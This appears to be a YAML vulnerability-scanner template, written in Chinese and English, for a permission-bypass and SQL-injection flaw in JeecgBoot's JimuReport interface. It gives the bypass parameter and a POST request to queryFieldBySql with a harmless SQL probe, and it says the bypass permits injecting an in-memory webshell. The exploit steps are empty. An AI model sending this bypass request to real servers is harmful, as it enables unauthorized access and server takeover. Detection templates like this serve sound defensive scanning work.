app: JeecgBoot
query: app:"JeecgBoot"
meta:
  name: jeecg-boot系统接口jmLink权限绕过漏洞
  level: 4
  tags:
  - ultra_vires
  - sql_injection
  description: 接口是积木报表自带接口，正常访问会提示权限不足，但利用jmLink=YWFhfHxiYmI=可绕过权限校验。绕过权限校验后，可在请求体中注入内存马，可获取服务器权限。
  homepage: ""
  author: X prism
  references: https://wiki.ztian.red/page?item=docs/%E4%B8%93%E9%A1%B9%E8%A1%8C%E5%8A%A8/jeecg-boot%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3jmLink%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
  solution: 关注jmLink=参数，加强监控
  create_at: "2024-08-22 11:29:58"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123123
          redirect: true
          header:
          - Content-Type: application/json
          params: '{"sql":"select ''1'' "}'
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: 解析成功
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
